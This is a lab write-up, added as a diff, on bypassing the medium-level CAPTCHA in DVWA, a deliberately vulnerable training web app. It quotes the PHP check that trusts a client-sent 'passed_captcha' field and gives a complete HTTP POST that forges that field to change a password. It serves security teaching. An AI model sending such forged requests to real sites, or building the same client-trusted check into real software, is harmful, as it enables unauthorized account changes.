@@ -1,0 +1,85 @@
+#+TITLE: DVWA - Insecure CAPTCHA Medium
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  Same setup as before, but now the php code server side that does the
+  verification is different. In particular now the verification of the
+  CAPTCHA is done by checking the value of a specific ~POST~ parameter
+
+  #+begin_src php
+if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
+    // Hide the CAPTCHA form
+    $hide_form = true;
+
+    // Get input
+    $pass_new  = $_POST[ 'password_new' ];
+    $pass_conf = $_POST[ 'password_conf' ];
+
+    // Check to see if they did stage 1
+    if( !$_POST[ 'passed_captcha' ] ) {
+        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
+        $hide_form = false;
+        return;
+    }
+  #+end_src
+
+  This is sent by the php server when the CAPTCHA check is performed
+
+  #+begin_src php
+  // Check CAPTCHA from 3rd party
+    $resp = recaptcha_check_answer(
+        $_DVWA[ 'recaptcha_private_key' ],
+        $_POST['g-recaptcha-response']
+    );
+
+    // Did the CAPTCHA fail?
+    if( !$resp ) {
+        // What happens when the CAPTCHA was entered incorrectly
+        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
+        $hide_form = false;
+        return;
+    }
+    else {
+        // CAPTCHA was correct. Do both new passwords match?
+        if( $pass_new == $pass_conf ) {
+            // Show next stage for the user
+            echo "
+                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
+                <form action=\"#\" method=\"POST\">
+                    <input type=\"hidden\" name=\"step\" value=\"2\" />
+                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
+                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
+                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
+                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
+                </form>";
+        }
+        else {
+            // Both new passwords do not match.
+            $html     .= "<pre>Both passwords must match.</pre>";
+            $hide_form = false;
+        }
+    }
+  #+end_src
+  
+* Solution
+  The following HTTP request will bypass the CAPTCHA
+
+  #+begin_example
+POST /vulnerabilities/captcha/ HTTP/1.1
+Host: evil
+Content-Length: 83
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/captcha/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=j7f5mt685vjonmnvrt6mij8t50; security=medium
+Connection: close
+
+step=2&password_new=newpass&password_conf=newpass&passed_captcha=True&Change=Change
+  #+end_example
+  
